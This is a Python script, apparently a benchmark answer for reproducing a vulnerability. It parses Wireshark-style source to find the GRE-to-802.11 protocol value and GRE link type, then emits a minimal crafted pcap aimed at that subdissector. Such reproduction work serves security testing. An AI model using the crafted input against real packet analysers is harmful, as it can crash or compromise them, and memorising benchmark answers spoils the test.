import os
import re
import ast
import tarfile
import struct
from typing import Dict, Optional, Tuple, Iterator


class _ConstResolver:
    def __init__(self) -> None:
        self.defs: Dict[str, str] = {}
        self.cache: Dict[str, int] = {}
        self.in_progress = set()

    @staticmethod
    def _strip_comments(s: str) -> str:
        s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
        s = re.sub(r"//.*", "", s)
        return s.strip()

    def add_def(self, name: str, expr: str) -> None:
        expr = self._strip_comments(expr)
        if not expr:
            return
        self.defs[name] = expr

    @staticmethod
    def _remove_int_suffixes(expr: str) -> str:
        expr = re.sub(r"\b(0[xX][0-9A-Fa-f]+)[uUlL]+\b", r"\1", expr)
        expr = re.sub(r"\b([0-9]+)[uUlL]+\b", r"\1", expr)
        expr = re.sub(r"\b(0[xX][0-9A-Fa-f]+)[uUlL]+", r"\1", expr)
        expr = re.sub(r"\b([0-9]+)[uUlL]+", r"\1", expr)
        return expr

    @staticmethod
    def _remove_common_casts(expr: str) -> str:
        cast_pat = r"\(\s*(?:const\s+)?(?:volatile\s+)?(?:(?:un)?signed\s+)?(?:(?:long\s+long)|(?:long)|(?:short)|(?:int)|(?:char)|(?:void)|(?:size_t)|(?:ssize_t)|(?:ptrdiff_t)|(?:g?u?int(?:8|16|32|64)?_t?)|(?:g?u?int(?:8|16|32|64)?)|(?:gint)|(?:guint)|(?:guint8)|(?:guint16)|(?:guint32)|(?:guint64)|(?:uint8_t)|(?:uint16_t)|(?:uint32_t)|(?:uint64_t)|(?:int8_t)|(?:int16_t)|(?:int32_t)|(?:int64_t))\s*\*?\s*\)"
        prev = None
        while prev != expr:
            prev = expr
            expr = re.sub(cast_pat, "", expr)
        return expr

    @staticmethod
    def _sanitize_expr(expr: str) -> str:
        expr = expr.strip()
        expr = expr.replace("&&", " and ").replace("||", " or ")
        expr = expr.replace("!", " not ")
        return expr

    def _ast_eval(self, node: ast.AST) -> int:
        if isinstance(node, ast.Expression):
            return self._ast_eval(node.body)
        if isinstance(node, ast.Constant):
            if isinstance(node.value, bool):
                return int(node.value)
            if isinstance(node.value, int):
                return int(node.value)
            raise ValueError("unsupported constant")
        if isinstance(node, ast.UnaryOp):
            v = self._ast_eval(node.operand)
            if isinstance(node.op, ast.UAdd):
                return +v
            if isinstance(node.op, ast.USub):
                return -v
            if isinstance(node.op, ast.Invert):
                return ~v
            if isinstance(node.op, ast.Not):
                return int(not bool(v))
            raise ValueError("unsupported unary op")
        if isinstance(node, ast.BinOp):
            a = self._ast_eval(node.left)
            b = self._ast_eval(node.right)
            if isinstance(node.op, ast.Add):
                return a + b
            if isinstance(node.op, ast.Sub):
                return a - b
            if isinstance(node.op, ast.Mult):
                return a * b
            if isinstance(node.op, ast.FloorDiv):
                return a // b
            if isinstance(node.op, ast.Mod):
                return a % b
            if isinstance(node.op, ast.LShift):
                return a << b
            if isinstance(node.op, ast.RShift):
                return a >> b
            if isinstance(node.op, ast.BitOr):
                return a | b
            if isinstance(node.op, ast.BitAnd):
                return a & b
            if isinstance(node.op, ast.BitXor):
                return a ^ b
            raise ValueError("unsupported bin op")
        if isinstance(node, ast.BoolOp):
            if isinstance(node.op, ast.And):
                res = 1
                for v in node.values:
                    res = int(bool(res) and bool(self._ast_eval(v)))
                return res
            if isinstance(node.op, ast.Or):
                res = 0
                for v in node.values:
                    res = int(bool(res) or bool(self._ast_eval(v)))
                return res
            raise ValueError("unsupported bool op")
        if isinstance(node, ast.Compare):
            left = self._ast_eval(node.left)
            result = True
            for op, comp in zip(node.ops, node.comparators):
                right = self._ast_eval(comp)
                if isinstance(op, ast.Eq):
                    result = result and (left == right)
                elif isinstance(op, ast.NotEq):
                    result = result and (left != right)
                elif isinstance(op, ast.Lt):
                    result = result and (left < right)
                elif isinstance(op, ast.LtE):
                    result = result and (left <= right)
                elif isinstance(op, ast.Gt):
                    result = result and (left > right)
                elif isinstance(op, ast.GtE):
                    result = result and (left >= right)
                else:
                    raise ValueError("unsupported compare op")
                left = right
            return int(result)
        raise ValueError("unsupported AST node")

    def _resolve_expr(self, expr: str) -> Optional[int]:
        expr = self._strip_comments(expr)
        expr = self._remove_int_suffixes(expr)
        expr = self._remove_common_casts(expr)
        expr = expr.strip()
        if not expr:
            return None

        expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
        expr = self._sanitize_expr(expr)

        def repl_ident(m: re.Match) -> str:
            name = m.group(0)
            if name in ("and", "or", "not"):
                return name
            if name in self.defs:
                v = self.resolve(name)
                return str(v)
            if name.startswith("LINKTYPE_"):
                alt = "DLT_" + name[len("LINKTYPE_") :]
                if alt in self.defs:
                    v = self.resolve(alt)
                    return str(v)
            if name.startswith("DLT_"):
                alt = "LINKTYPE_" + name[len("DLT_") :]
                if alt in self.defs:
                    v = self.resolve(alt)
                    return str(v)
            return name

        expr2 = re.sub(r"\b[A-Za-z_]\w*\b", repl_ident, expr)
        if re.search(r"\b[A-Za-z_]\w*\b", expr2):
            return None
        try:
            tree = ast.parse(expr2, mode="eval")
            return int(self._ast_eval(tree))
        except Exception:
            return None

    def resolve(self, name: str) -> int:
        if name in self.cache:
            return self.cache[name]
        if name in self.in_progress:
            raise ValueError(f"circular define: {name}")
        if name not in self.defs:
            if name.startswith("LINKTYPE_"):
                alt = "DLT_" + name[len("LINKTYPE_") :]
                if alt in self.defs:
                    return self.resolve(alt)
            if name.startswith("DLT_"):
                alt = "LINKTYPE_" + name[len("DLT_") :]
                if alt in self.defs:
                    return self.resolve(alt)
            raise KeyError(name)
        self.in_progress.add(name)
        v = self._resolve_expr(self.defs[name])
        self.in_progress.remove(name)
        if v is None:
            raise ValueError(f"unable to evaluate: {name} = {self.defs[name]!r}")
        self.cache[name] = v
        return v


def _iter_source_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        for root, _, files in os.walk(src_path):
            for fn in files:
                p = os.path.join(root, fn)
                rel = os.path.relpath(p, src_path)
                try:
                    with open(p, "rb") as f:
                        yield rel.replace("\\", "/"), f.read()
                except Exception:
                    continue
        return

    with tarfile.open(src_path, "r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            if m.size <= 0:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                yield m.name, f.read()
            except Exception:
                continue


def _to_text(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        try:
            return b.decode("latin-1", "ignore")
        except Exception:
            return ""


def _extract_needed_tokens(src_path: str) -> Tuple[Optional[str], Optional[str]]:
    gre_proto_expr = None
    linktype_token = None

    add_uint_re = re.compile(
        r'dissector_add_uint(?:_[a-zA-Z0-9_]+)?\s*\(\s*"gre\.proto"\s*,\s*([^,]+?)\s*,\s*([^\)]*?)\)',
        re.S,
    )

    for path, data in _iter_source_files(src_path):
        lp = path.lower()
        if not (lp.endswith(".c") or lp.endswith(".h")):
            continue

        # Prefer the likely files but keep it somewhat robust.
        if ("packet-gre" in lp) or ("gre.proto" in data):
            text = _to_text(data)
            if "gre.proto" in text and ("80211" in text or "802_11" in text or "ieee80211" in text or "wlan" in text):
                for m in add_uint_re.finditer(text):
                    expr = m.group(1).strip()
                    rest = m.group(2)
                    rest_l = rest.lower()
                    if ("80211" in rest_l) or ("802_11" in rest_l) or ("ieee80211" in rest_l) or ("wlan" in rest_l):
                        gre_proto_expr = expr
                        break
                if gre_proto_expr is not None:
                    break

    # Find pcap LINKTYPE token mapped to WTAP_ENCAP_GRE
    wtap_map_re1 = re.compile(r"\{\s*WTAP_ENCAP_GRE\s*,\s*(LINKTYPE_[A-Za-z0-9_]+)\s*\}")
    wtap_map_re2 = re.compile(r"\{\s*(LINKTYPE_[A-Za-z0-9_]+)\s*,\s*WTAP_ENCAP_GRE\s*\}")
    for path, data in _iter_source_files(src_path):
        lp = path.lower()
        if not (lp.endswith(".c") or lp.endswith(".h")):
            continue
        if "/wiretap/" not in ("/" + lp) and "pcap" not in lp:
            continue
        if b"WTAP_ENCAP_GRE" not in data:
            continue
        text = _to_text(data)
        m = wtap_map_re1.search(text)
        if m:
            linktype_token = m.group(1).strip()
            break
        m = wtap_map_re2.search(text)
        if m:
            linktype_token = m.group(1).strip()
            break
        if "LINKTYPE_GRE" in text:
            linktype_token = "LINKTYPE_GRE"
    return gre_proto_expr, linktype_token


def _build_defines_table(src_path: str) -> _ConstResolver:
    cr = _ConstResolver()

    define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$")

    for path, data in _iter_source_files(src_path):
        lp = path.lower()
        if not (lp.endswith(".h") or lp.endswith(".c")):
            continue
        if "/epan/" not in ("/" + lp) and "/wiretap/" not in ("/" + lp) and "pcap" not in lp:
            continue
        if len(data) > 2_500_000:
            continue

        text = _to_text(data)
        if "#define" not in text:
            continue

        for line in text.splitlines():
            m = define_re.match(line)
            if not m:
                continue
            name = m.group(1)
            rest = m.group(2).rstrip()
            if name.endswith("_H") and rest == "":
                continue
            if rest.startswith("("):  # function-like macro
                continue
            cr.add_def(name, rest)
    return cr


def _eval_token_or_expr(cr: _ConstResolver, expr: str) -> Optional[int]:
    expr = expr.strip()
    if not expr:
        return None
    if re.fullmatch(r"\(?\s*0[xX][0-9A-Fa-f]+[uUlL]*\s*\)?", expr) or re.fullmatch(r"\(?\s*\d+[uUlL]*\s*\)?", expr):
        expr2 = expr.strip()
        expr2 = expr2.strip("() \t\r\n")
        expr2 = re.sub(r"[uUlL]+$", "", expr2)
        try:
            return int(expr2, 0)
        except Exception:
            return None
    if re.fullmatch(r"[A-Za-z_]\w*", expr):
        try:
            return cr.resolve(expr)
        except Exception:
            return None
    try:
        v = cr._resolve_expr(expr)
        return v
    except Exception:
        return None


def _pcap_le(linktype: int, packet: bytes) -> bytes:
    ghdr = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 0xFFFF, linktype & 0xFFFFFFFF)
    phdr = struct.pack("<IIII", 0, 0, len(packet), len(packet))
    return ghdr + phdr + packet


class Solution:
    def solve(self, src_path: str) -> bytes:
        gre_proto_expr, linktype_token = _extract_needed_tokens(src_path)
        cr = _build_defines_table(src_path)

        # Resolve GRE protocol type for 802.11
        gre_ptype = None
        if gre_proto_expr:
            gre_ptype = _eval_token_or_expr(cr, gre_proto_expr)

        # Fallback: try common names if extraction failed
        if gre_ptype is None:
            for cand in ("ETHERTYPE_IEEE802_11", "ETHERTYPE_IEEE_802_11", "ETHERTYPE_802_11", "GRE_PROTO_802_11", "GRE_PROTO_WLAN", "GRE_WLAN"):
                try:
                    gre_ptype = cr.resolve(cand)
                    break
                except Exception:
                    continue

        if gre_ptype is None:
            gre_ptype = 0x0019  # best-effort fallback

        # Resolve pcap linktype for GRE
        linktype_val = None
        if linktype_token:
            linktype_val = _eval_token_or_expr(cr, linktype_token)
        if linktype_val is None:
            for cand in ("LINKTYPE_GRE", "DLT_GRE"):
                try:
                    linktype_val = cr.resolve(cand)
                    break
                except Exception:
                    continue
        if linktype_val is None:
            linktype_val = 47  # common libpcap DLT_GRE fallback

        flags_ver = 0x0000
        gre_hdr = struct.pack("!HH", flags_ver & 0xFFFF, gre_ptype & 0xFFFF)
        packet = gre_hdr + b"\x00"  # minimal payload to reach subdissector

        return _pcap_le(int(linktype_val), packet)